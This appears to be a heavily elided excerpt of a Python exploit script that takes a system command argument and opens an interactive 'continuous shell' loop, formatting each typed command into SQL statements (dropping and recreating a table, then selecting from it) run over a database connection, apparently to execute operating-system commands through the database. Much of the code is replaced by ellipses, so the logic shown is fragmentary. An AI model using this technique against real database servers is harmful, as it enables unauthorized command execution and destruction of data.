...
def parseArgs():
    ...
    parser.add_argument('-c', '--command', nargs='?', help='System command to run', required=False)
...
def exploit(connection):
    ...
    print("[+] Advanced continous shell: ")

    while True:
        try:
            cmd = input("Enter command to execute (Type 'exit' to quit): ")
            ...
            cursor.execute("DROP TABLE IF EXISTS {1};\
                            ...
                            SELECT * FROM {1};".format(cmd,tableName))
